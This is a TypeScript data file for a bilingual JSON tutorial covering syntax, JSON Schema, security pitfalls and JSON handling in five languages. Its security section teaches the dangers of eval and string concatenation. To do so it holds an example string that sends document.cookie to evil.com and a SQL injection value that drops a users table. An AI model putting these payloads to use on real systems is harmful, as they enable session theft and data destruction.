import type { GuideCategory, Category } from './types';

const JSON_COLOR = '#6ee7b7';

/** JSON 语法基础（对应《JSON 必知必会》第 1-3 章） */
export const jsonSyntax: GuideCategory = {
  id: 'json-syntax',
  title: { zh: 'JSON 语法基础', en: 'JSON Syntax Basics' },
  topics: [
    {
      id: 'json-what',
      title: { zh: '什么是 JSON', en: 'What is JSON' },
      description: {
        zh: 'JSON（JavaScript Object Notation）是一种独立于语言的数据交换格式：人类可读、机器易解析，已成为 API 通信的事实标准。它源自 JS 对象字面量，但不等于 JS 对象。',
        en: 'JSON (JavaScript Object Notation) is a language-independent data interchange format: human-readable, machine-friendly, the de facto standard for APIs. Derived from JS object literals, but not the same thing.',
      },
      lang: 'json',
      langLabel: 'JSON',
      color: JSON_COLOR,
      code: `// 一个最小的 JSON 文档（实际文件中不能有注释！）
{
  "name": "小麦",
  "role": "后端工程师",
  "skills": ["Java", "Go", "Python"],
  "years": 3,
  "remote": true,
  "mentor": null
}

// 记住三个核心概念：
// 1. 名称-值对（name-value pair）："name": "小麦"
// 2. 名称必须用双引号包裹的字符串
// 3. 值只能是六种数据类型之一（见下一节）

// JSON 不是 JS 对象！区别：
// JS 对象：{ name: 'x', }   ← 键可不带引号、可单引号、可尾逗号、可有注释
// JSON：   { "name": "x" }  ← 键必须双引号、禁止尾逗号、禁止注释`,
    },
    {
      id: 'json-types',
      title: { zh: '六种数据类型', en: 'The Six Data Types' },
      description: {
        zh: 'JSON 只有六种值类型：对象、数组、字符串、数字、布尔、null。没有日期、没有函数、没有 undefined——日期只能约定成字符串（推荐 ISO 8601）。',
        en: 'JSON has exactly six value types: object, array, string, number, boolean, null. No dates, no functions, no undefined — dates travel as strings (prefer ISO 8601).',
      },
      lang: 'json',
      langLabel: 'JSON',
      color: JSON_COLOR,
      code: `{
  "object_example": { "nested": true },
  "array_example": [1, "two", false, null, [3], {}],
  "string_example": "双引号包裹，支持 \\n \\t \\" 转义",
  "number_integer": 42,
  "number_float": -3.14,
  "number_scientific": 6.02e23,
  "boolean_true": true,
  "boolean_false": false,
  "null_example": null
}

// 数字类型的注意点：
// - 不区分 int/float，都是 number
// - 超大整数（如订单号 2^53 以上）在 JS 中会丢精度 → 用字符串传
// - NaN 和 Infinity 不是合法 JSON！

// 日期的通用约定（JSON 没有日期类型）：
{ "createdAt": "2026-08-01T09:30:00+08:00" }   ← ISO 8601，推荐`,
    },
    {
      id: 'json-valid',
      title: { zh: '合法 vs 非法语法', en: 'Valid vs Invalid Syntax' },
      description: {
        zh: '90% 的 JSON 解析报错来自这几类错误。写配置、调接口时逐条对照排查。可以用 jsonlint.com 或编辑器插件做语法验证。',
        en: '90% of JSON parse errors come from these mistakes. Check against this list when writing configs or calling APIs. Validate with jsonlint.com or editor plugins.',
      },
      lang: 'json',
      langLabel: 'JSON',
      color: JSON_COLOR,
      code: `// ❌ 非法：键没有引号
{ name: "小麦" }

// ❌ 非法：单引号（JSON 只认双引号）
{ "name": '小麦' }

// ❌ 非法：尾逗号（最后一个元素后多了逗号）
{ "skills": ["Java", "Go", ] }

// ❌ 非法：注释（JSON 标准不允许任何注释）
{ /* 用户表 */ "name": "小麦" }

// ❌ 非法：undefined / NaN / 函数
{ "callback": function() {}, "age": undefined }

// ❌ 非法：裸的顶层基本类型（部分解析器允许，但规范建议顶层用对象或数组）
"hello"

// ✅ 合法范本
{
  "user": {
    "id": 10001,
    "name": "小麦",
    "tags": ["后端", "全栈"],
    "active": true,
    "deletedAt": null
  }
}`,
    },
    {
      id: 'json-realworld',
      title: { zh: '真实 API 响应长什么样', en: 'A Real-world API Response' },
      description: {
        zh: '企业级接口常见的"统一响应包"结构：code/message/data 三段式 + 分页元信息。读懂它，就看懂了大多数后端接口。',
        en: 'The common enterprise "unified envelope": code/message/data triple plus pagination metadata. Understand this and you can read most backend APIs.',
      },
      lang: 'json',
      langLabel: 'JSON',
      color: JSON_COLOR,
      code: `{
  "code": 0,
  "message": "success",
  "data": {
    "list": [
      {
        "id": 10001,
        "username": "xiaomai",
        "profile": {
          "nickname": "小麦",
          "avatar": "https://cdn.example.com/u/10001.png"
        },
        "roles": ["admin", "dev"],
        "createdAt": "2026-08-01T09:00:00+08:00"
      },
      {
        "id": 10002,
        "username": "laoqi",
        "profile": {
          "nickname": "老七",
          "avatar": null
        },
        "roles": ["dev"],
        "createdAt": "2026-07-15T14:20:00+08:00"
      }
    ],
    "pagination": {
      "page": 1,
      "pageSize": 20,
      "total": 137,
      "hasMore": true
    }
  },
  "traceId": "a1b2c3d4-e5f6-7890"
}

// 阅读技巧：
// - code: 0 通常表示成功（有的公司用 200 或 "OK"）
// - data.list 是业务数据本体
// - avatar: null 是合法的，前端/客户端必须做好空值处理
// - traceId 用于全链路日志排查，报障时带上它`,
    },
    {
      id: 'json-file',
      title: { zh: 'JSON 文件与媒体类型', en: 'JSON Files & Media Type' },
      description: {
        zh: '.json 文件、application/json 媒体类型、UTF-8 编码——以及"长得像 JSON"的 JSON5/JSONC/JSONL 兄弟们。',
        en: '.json files, the application/json media type, UTF-8 encoding — and JSON\'s lookalike cousins: JSON5 / JSONC / JSONL.',
      },
      lang: 'bash',
      langLabel: 'Bash',
      color: '#fcd34d',
      code: `# JSON 文件约定
#   扩展名：.json        编码：UTF-8（标准规定，无需 BOM）
#   媒体类型（MIME）：application/json
#   HTTP 请求/响应头里这样声明：
Content-Type: application/json; charset=utf-8

# 命令行快速验证 JSON 是否合法（三选一）
python -m json.tool config.json          # 合法则格式化输出，非法报错
node -e "JSON.parse(require('fs').readFileSync('config.json'))"
jq . config.json                          # jq 还能顺便美化

# 常见的"JSON 近亲"（不是标准 JSON，注意区分）：
#   JSON5 / JSONC：允许注释、尾逗号、单引号 → VS Code 的 settings.json
#   JSONL / NDJSON：每行一个 JSON 对象 → 日志、大数据导入导出
{"level":"info","msg":"服务启动","ts":"2026-08-01T09:00:00Z"}
{"level":"error","msg":"连接超时","ts":"2026-08-01T09:01:23Z"}

# 注意：JSON Schema 文件本身也是 JSON（见后面章节）`,
    },
  ],
};

/** JSON Schema 与安全（对应《JSON 必知必会》第 4-5 章） */
export const jsonSchemaSecurity: GuideCategory = {
  id: 'json-schema',
  title: { zh: 'JSON Schema 与安全', en: 'JSON Schema & Security' },
  topics: [
    {
      id: 'json-schema-intro',
      title: { zh: 'JSON Schema 验证入门', en: 'JSON Schema Validation' },
      description: {
        zh: 'JSON Schema 用 JSON 描述 JSON 的形状：哪些字段必填、类型是什么、取值范围多少。接口契约、配置校验、表单生成都靠它。',
        en: 'JSON Schema describes JSON\'s shape in JSON: required fields, types, ranges. Powers API contracts, config validation, and form generation.',
      },
      lang: 'json',
      langLabel: 'JSON Schema',
      color: JSON_COLOR,
      code: `{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "title": "创建用户请求",
  "type": "object",
  "required": ["username", "email", "age"],
  "properties": {
    "username": {
      "type": "string",
      "minLength": 3,
      "maxLength": 20,
      "pattern": "^[a-zA-Z0-9_]+$"
    },
    "email": { "type": "string", "format": "email" },
    "age":  { "type": "integer", "minimum": 0, "maximum": 150 },
    "roles": {
      "type": "array",
      "items": { "type": "string", "enum": ["admin", "dev", "ops"] },
      "uniqueItems": true,
      "default": ["dev"]
    },
    "profile": {
      "type": "object",
      "properties": {
        "nickname": { "type": "string" },
        "bio": { "type": ["string", "null"] }
      }
    }
  },
  "additionalProperties": false
}

// 上面这份 Schema 规定：
// - username/email/age 必填，额外字段一律拒绝
// - username 是 3-20 位字母数字下划线
// - roles 是字符串数组，只能是 admin/dev/ops，元素不重复
// - bio 可以是字符串或 null（可空字段的标准写法）`,
    },
    {
      id: 'json-security',
      title: { zh: 'JSON 安全陷阱', en: 'JSON Security Pitfalls' },
      description: {
        zh: '三个必须知道的安全问题：eval 解析引狼入室（XSS）、JSON 注入、CSRF。原则只有一条：永远把 JSON 当不可信数据处理。',
        en: 'Three must-know security issues: eval parsing (XSS), JSON injection, CSRF. One principle: always treat JSON as untrusted data.',
      },
      lang: 'javascript',
      langLabel: 'Node.js',
      color: '#F7DF1E',
      code: `// 陷阱 1：用 eval 解析 JSON —— 等于执行任意代码！
const evil = '({ steal: fetch("https://evil.com?c="+document.cookie) })';
// eval(evil);              // ❌ 永远不要这么做
JSON.parse(evil);           // ✅ 只会抛语法错误，不执行代码

// 陷阱 2：拼接 JSON 字符串 → 注入
const name = '"; DROP TABLE users; --';
// const json = '{"name": "' + name + '"}';   // ❌ 引号打破结构
const safe = JSON.stringify({ name });        // ✅ 永远用序列化函数

// 陷阱 3：服务端把"数组"当顶层返回的 CSRF 历史问题
// 现代浏览器已修复，但企业接口仍习惯用对象包裹：
// ✅ { "code": 0, "data": [...] }   而不是裸 [...]

// 后端通用防御清单：
// 1. 入参 JSON 先过 Schema 校验（类型、长度、枚举）
// 2. 解析失败返回 400，不要把解析异常堆栈暴露给客户端
// 3. 限制请求体大小（防 DoS），如 Express: express.json({ limit: '1mb' })
// 4. 输出到 HTML 时转义 < > &，防存储型 XSS`,
    },
  ],
};

/** 五语言读写 JSON 对照 */
export const jsonCompare: Category = {
  id: 'json-compare',
  title: { zh: '五语言读写 JSON 对照', en: 'JSON in Five Languages' },
  topics: [
    {
      id: 'json-parse',
      title: { zh: '解析 JSON 字符串并提取嵌套字段', en: 'Parse JSON & Access Nested Fields' },
      description: {
        zh: '拿到接口返回的 JSON 字符串，解析后取出 data.list[0].profile.nickname。',
        en: 'Parse an API response string and extract data.list[0].profile.nickname.',
      },
      snippets: {
        python: `import json

raw = '{"data": {"list": [{"profile": {"nickname": "小麦"}}]}}'

# json.loads：字符串 → dict/list（解析失败抛 JSONDecodeError）
obj = json.loads(raw)

# dict 逐层取值；用 .get() 链防御缺失字段
nickname = (
    obj.get('data', {})
       .get('list', [{}])[0]
       .get('profile', {})
       .get('nickname', '未知')
)
print(nickname)  # 小麦`,
        javascript: `const raw = '{"data":{"list":[{"profile":{"nickname":"小麦"}}]}}';

// JSON.parse：字符串 → 对象（非法 JSON 抛 SyntaxError）
const obj = JSON.parse(raw);

// 可选链 ?. + 空合并 ?? 是嵌套取值的最佳拍档
const nickname = obj?.data?.list?.[0]?.profile?.nickname ?? '未知';
console.log(nickname); // 小麦`,
        java: `import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

String raw = "{\\"data\\": {\\"list\\": [{\\"profile\\": {\\"nickname\\": \\"小麦\\"}}]}}";

// Jackson 是 Spring Boot 默认 JSON 库
ObjectMapper mapper = new ObjectMapper();
JsonNode root = mapper.readTree(raw);   // 字符串 → 树模型

// 链式取值；路径不存在时用 at() + asText 兜底
String nickname = root.at("/data/list/0/profile/nickname").asText("未知");
System.out.println(nickname); // 小麦`,
        go: `package main

import (
	"encoding/json"
	"fmt"
)

// 先定义与 JSON 形状匹配的结构体（Go 的惯用法）
type Response struct {
	Data struct {
		List []struct {
			Profile struct {
				Nickname string \`json:"nickname"\`
			} \`json:"profile"\`
		} \`json:"list"\`
	} \`json:"data"\`
}

func main() {
	raw := []byte(\`{"data":{"list":[{"profile":{"nickname":"小麦"}}]}}\`)

	var resp Response
	if err := json.Unmarshal(raw, &resp); err != nil {
		panic(err) // 解析失败返回 error
	}

	nickname := "未知"
	if len(resp.Data.List) > 0 && resp.Data.List[0].Profile.Nickname != "" {
		nickname = resp.Data.List[0].Profile.Nickname
	}
	fmt.Println(nickname) // 小麦
}`,
        rust: `use serde::Deserialize;

// serde 是 Rust 生态事实标准：derive 宏自动生成解析代码
#[derive(Deserialize)]
struct Response {
    data: Data,
}

#[derive(Deserialize)]
struct Data {
    list: Vec<Item>,
}

#[derive(Deserialize)]
struct Item {
    profile: Profile,
}

#[derive(Deserialize)]
struct Profile {
    nickname: Option<String>, // 可空字段用 Option
}

fn main() {
    let raw = r#"{"data":{"list":[{"profile":{"nickname":"小麦"}}]}}"#;

    // serde_json::from_str：字符串 → 强类型结构体
    let resp: Response = serde_json::from_str(raw).unwrap();

    let nickname = resp
        .data
        .list
        .first()
        .and_then(|item| item.profile.nickname.as_deref())
        .unwrap_or("未知");
    println!("{}", nickname); // 小麦
}`,
      },
    },
    {
      id: 'json-serialize',
      title: { zh: '对象序列化为 JSON 字符串', en: 'Serialize Objects to JSON' },
      description: {
        zh: '把语言内的对象/结构体转成 JSON 字符串返回给前端，注意命名风格（驼峰 vs 下划线）和可空字段处理。',
        en: 'Convert native objects to JSON strings for API responses. Watch naming style (camelCase vs snake_case) and nullable fields.',
      },
      snippets: {
        python: `import json
from dataclasses import dataclass, asdict

@dataclass
class User:
    id: int
    username: str
    is_active: bool
    deleted_at: str | None = None

user = User(10001, 'xiaomai', True)

# json.dumps：对象 → 字符串
# ensure_ascii=False 保留中文；indent 美化输出
text = json.dumps(asdict(user), ensure_ascii=False, indent=2)
print(text)
# {
#   "id": 10001,
#   "username": "xiaomai",
#   "is_active": true,
#   "deleted_at": null
# }`,
        javascript: `const user = {
  id: 10001,
  username: 'xiaomai',
  isActive: true,          // JS 习惯驼峰
  deletedAt: null,
  password: 'secret',      // ⚠️ 敏感字段
};

// JSON.stringify：对象 → 字符串
console.log(JSON.stringify(user, null, 2));

// 第二个参数可以是过滤函数/数组：剔除敏感字段
const safe = JSON.stringify(user, ['id', 'username', 'isActive', 'deletedAt']);
console.log(safe);
// {"id":10001,"username":"xiaomai","isActive":true,"deletedAt":null}

// 注意：undefined、函数、Symbol 会被静默丢弃
console.log(JSON.stringify({ a: undefined, b: () => {} })); // {}`,
        java: `import com.fasterxml.jackson.annotation.JsonInclude;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.fasterxml.jackson.databind.ObjectMapper;

// 字段映射与可空控制都靠注解
@JsonInclude(JsonInclude.Include.NON_NULL) // null 字段不输出
class User {
    public Long id;

    @JsonProperty("user_name")   // Java 驼峰 → JSON 下划线
    public String userName;

    public Boolean active;
    public String deletedAt;
}

ObjectMapper mapper = new ObjectMapper();
User user = new User();
user.id = 10001L;
user.userName = "xiaomai";
user.active = true;

String text = mapper.writeValueAsString(user);
System.out.println(text);
// {"id":10001,"user_name":"xiaomai","active":true}`,
        go: `package main

import (
	"encoding/json"
	"fmt"
)

// 结构体标签控制 JSON 字段名和输出行为
type User struct {
	ID        int64   \`json:"id"\`
	Username  string  \`json:"username"\`
	Active    bool    \`json:"active"\`
	DeletedAt *string \`json:"deletedAt,omitempty"\` // nil 则不输出
	Password  string  \`json:"-"\`                    // 永远不输出
}

func main() {
	user := User{ID: 10001, Username: "xiaomai", Active: true, Password: "secret"}

	// json.Marshal：结构体 → []byte
	b, _ := json.Marshal(user)
	fmt.Println(string(b))
	// {"id":10001,"username":"xiaomai","active":true}

	// 美化输出版本
	pretty, _ := json.MarshalIndent(user, "", "  ")
	fmt.Println(string(pretty))
}`,
        rust: `use serde::Serialize;

// rename_all 统一把 snake_case 字段转成驼峰输出
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct User {
    id: i64,
    username: String,
    is_active: bool,

    // None 时跳过该字段
    #[serde(skip_serializing_if = "Option::is_none")]
    deleted_at: Option<String>,

    // 敏感字段永不序列化
    #[serde(skip)]
    password: String,
}

fn main() {
    let user = User {
        id: 10001,
        username: "xiaomai".into(),
        is_active: true,
        deleted_at: None,
        password: "secret".into(),
    };

    // serde_json::to_string：结构体 → JSON 字符串
    let text = serde_json::to_string(&user).unwrap();
    println!("{}", text);
    // {"id":10001,"username":"xiaomai","isActive":true}
}`,
      },
    },
    {
      id: 'json-file-io',
      title: { zh: '读写 JSON 文件', en: 'Read & Write JSON Files' },
      description: {
        zh: '配置文件、种子数据、本地缓存都常存成 .json 文件：读进来解析，改完写回去。',
        en: 'Configs, seed data, local caches often live in .json files: read, parse, modify, write back.',
      },
      snippets: {
        python: `import json

# 读：with 保证文件关闭；encoding 显式指定 utf-8
with open('config.json', encoding='utf-8') as f:
    config = json.load(f)          # 文件 → dict

print(config['database']['host'])

# 改
config['database']['pool_size'] = 20

# 写：indent 美化，ensure_ascii=False 保留中文
with open('config.json', 'w', encoding='utf-8') as f:
    json.dump(config, f, ensure_ascii=False, indent=2)`,
        javascript: `import { readFile, writeFile } from 'node:fs/promises';

// 读 + 解析（Node 不能直接 require 不确定的 JSON，安全起见手动 parse）
const raw = await readFile('config.json', 'utf-8');
const config = JSON.parse(raw);

console.log(config.database.host);

// 改
config.database.pool_size = 20;

// 写回：第三个参数 2 = 缩进两格
await writeFile('config.json', JSON.stringify(config, null, 2), 'utf-8');`,
        java: `import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import java.nio.file.*;

ObjectMapper mapper = new ObjectMapper();

// 读 + 解析为可修改的树节点
String raw = Files.readString(Path.of("config.json"));
ObjectNode config = (ObjectNode) mapper.readTree(raw);

System.out.println(config.at("/database/host").asText());

// 改：put 直接替换字段值
((ObjectNode) config.get("database")).put("pool_size", 20);

// 写回（带缩进的美化格式）
String pretty = mapper.writerWithDefaultPrettyPrinter()
                      .writeValueAsString(config);
Files.writeString(Path.of("config.json"), pretty);`,
        go: `package main

import (
	"encoding/json"
	"fmt"
	"os"
)

type Config struct {
	Database struct {
		Host     string \`json:"host"\`
		PoolSize int    \`json:"pool_size"\`
	} \`json:"database"\`
}

func main() {
	// 读
	raw, err := os.ReadFile("config.json")
	if err != nil {
		panic(err)
	}
	var config Config
	if err := json.Unmarshal(raw, &config); err != nil {
		panic(err)
	}
	fmt.Println(config.Database.Host)

	// 改
	config.Database.PoolSize = 20

	// 写：0644 是 Unix 风格文件权限
	pretty, _ := json.MarshalIndent(config, "", "  ")
	if err := os.WriteFile("config.json", pretty, 0644); err != nil {
		panic(err)
	}
}`,
        rust: `use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
struct Config {
    database: Database,
}

#[derive(Serialize, Deserialize)]
struct Database {
    host: String,
    pool_size: u32,
}

fn main() -> std::io::Result<()> {
    // 读 + 解析
    let raw = std::fs::read_to_string("config.json")?;
    let mut config: Config =
        serde_json::from_str(&raw).expect("JSON 格式非法");
    println!("{}", config.database.host);

    // 改
    config.database.pool_size = 20;

    // 写回（美化格式）
    let pretty = serde_json::to_string_pretty(&config).unwrap();
    std::fs::write("config.json", pretty)?;
    Ok(())
}`,
      },
    },
    {
      id: 'json-array',
      title: { zh: '遍历与变换 JSON 数组', en: 'Iterate & Transform JSON Arrays' },
      description: {
        zh: '接口 list 数据的日常三件套：遍历、过滤、映射成自己要的形状。',
        en: 'The daily trio for API list data: iterate, filter, map into the shape you need.',
      },
      snippets: {
        python: `import json

raw = '[{"name": "小麦", "age": 28}, {"name": "老七", "age": 17}, {"name": "阿强", "age": 35}]'
users = json.loads(raw)

# 遍历
for u in users:
    print(u['name'], u['age'])

# 过滤 + 映射：列表推导式一步到位
adult_names = [u['name'] for u in users if u['age'] >= 18]
print(adult_names)  # ['小麦', '阿强']

# 聚合
avg = sum(u['age'] for u in users) / len(users)
print(f'平均年龄 {avg:.1f}')  # 平均年龄 26.7`,
        javascript: `const raw = '[{"name":"小麦","age":28},{"name":"老七","age":17},{"name":"阿强","age":35}]';
const users = JSON.parse(raw);

// 遍历
users.forEach((u) => console.log(u.name, u.age));

// 过滤 + 映射：链式一气呵成
const adultNames = users.filter((u) => u.age >= 18).map((u) => u.name);
console.log(adultNames); // ['小麦', '阿强']

// 聚合：reduce
const avg = users.reduce((sum, u) => sum + u.age, 0) / users.length;
console.log(\`平均年龄 \${avg.toFixed(1)}\`); // 平均年龄 26.7`,
        java: `import com.fasterxml.jackson.databind.*;
import java.util.*;

String raw = "[{\\"name\\":\\"小麦\\",\\"age\\":28},{\\"name\\":\\"老七\\",\\"age\\":17},{\\"name\\":\\"阿强\\",\\"age\\":35}]";
ObjectMapper mapper = new ObjectMapper();
ArrayNode users = (ArrayNode) mapper.readTree(raw);

// 遍历
for (JsonNode u : users) {
    System.out.println(u.get("name").asText() + " " + u.get("age").asInt());
}

// 过滤 + 映射：Stream 链式处理
List<String> adultNames = new ArrayList<>();
int sum = 0;
for (JsonNode u : users) {
    int age = u.get("age").asInt();
    sum += age;
    if (age >= 18) adultNames.add(u.get("name").asText());
}
System.out.println(adultNames);                       // [小麦, 阿强]
System.out.println("平均年龄 " + sum / (double) users.size()); // 26.67`,
        go: `package main

import (
	"encoding/json"
	"fmt"
)

type User struct {
	Name string \`json:"name"\`
	Age  int    \`json:"age"\`
}

func main() {
	raw := []byte(\`[{"name":"小麦","age":28},{"name":"老七","age":17},{"name":"阿强","age":35}]\`)
	var users []User
	json.Unmarshal(raw, &users)

	// 遍历 + 过滤 + 映射：一个循环全搞定
	var adultNames []string
	sum := 0
	for _, u := range users {
		fmt.Println(u.Name, u.Age)
		sum += u.Age
		if u.Age >= 18 {
			adultNames = append(adultNames, u.Name)
		}
	}
	fmt.Println(adultNames)                          // [小麦 阿强]
	fmt.Printf("平均年龄 %.1f\\n", float64(sum)/float64(len(users))) // 26.7
}`,
        rust: `use serde::Deserialize;

#[derive(Deserialize)]
struct User {
    name: String,
    age: u32,
}

fn main() {
    let raw = r#"[{"name":"小麦","age":28},{"name":"老七","age":17},{"name":"阿强","age":35}]"#;
    let users: Vec<User> = serde_json::from_str(raw).unwrap();

    // 遍历
    for u in &users {
        println!("{} {}", u.name, u.age);
    }

    // 过滤 + 映射：迭代器链
    let adult_names: Vec<&str> = users
        .iter()
        .filter(|u| u.age >= 18)
        .map(|u| u.name.as_str())
        .collect();
    println!("{:?}", adult_names); // ["小麦", "阿强"]

    // 聚合
    let avg = users.iter().map(|u| u.age).sum::<u32>() as f64 / users.len() as f64;
    println!("平均年龄 {:.1}", avg); // 平均年龄 26.7
}`,
      },
    },
  ],
};
